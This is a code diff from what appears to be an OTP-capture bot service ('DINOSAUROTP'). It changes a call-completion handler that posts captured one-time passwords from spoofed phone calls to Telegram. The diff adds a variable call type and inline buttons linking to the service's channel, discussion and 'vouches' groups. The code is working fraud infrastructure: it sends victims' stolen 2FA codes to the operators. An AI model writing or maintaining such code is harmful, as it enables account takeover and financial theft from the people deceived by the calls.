@@ -1938,11 +1938,12 @@ async def handle_call_events(request: Request):
             if session.get("otp_received"):
                 try:
                     user_email_censored = censor_email(session.get("user_email", "unknown@email.com"))
+                    call_type = session.get("call_type", "Custom")
                     otp = session.get("otp_received")
                     otp_digits = len(str(otp))
                     
                     telegram_message = f"""┏ 📱 Call completed successfully!
-┣ Call Type: Custom
+┣ Call Type: {call_type}
 ┣ Mode: Live
 ┣ Service: {session.get('service_name', 'N/A')}
 ┣ Is Spoofing: Yes
@@ -1952,11 +1953,16 @@ async def handle_call_events(request: Request):
 
 ┏ ℹ️ Captures ℹ️
 ┣ 📍 OTP ({otp_digits}): {otp}
-┗ Captured By: {user_email_censored}
-
-© BOT | DINOSAURODISCUSSION https://t.me/DINOSAUROTPDISCUSSION | VOUCHES LINK https://t.me/DINOSAUROTPVOUCHES | DINOSAUROTP https://t.me/DINOSAUROTP"""
+┗ Captured By: {user_email_censored}"""
                     
-                    asyncio.create_task(send_telegram_message(telegram_message))
+                    # Inline buttons
+                    buttons = [
+                        {"text": "DINOSAUROTP Channel", "url": "https://t.me/DINOSAUROTP"},
+                        {"text": "Discussion", "url": "https://t.me/DINOSAUROTPDISCUSSION"},
+                        {"text": "Vouches", "url": "https://t.me/DINOSAUROTPVOUCHES"}
+                    ]
+                    
+                    asyncio.create_task(send_telegram_message(telegram_message, buttons))
                 except Exception as e:
                     logger.error(f"Failed to send Telegram completion notification: {e}")
 
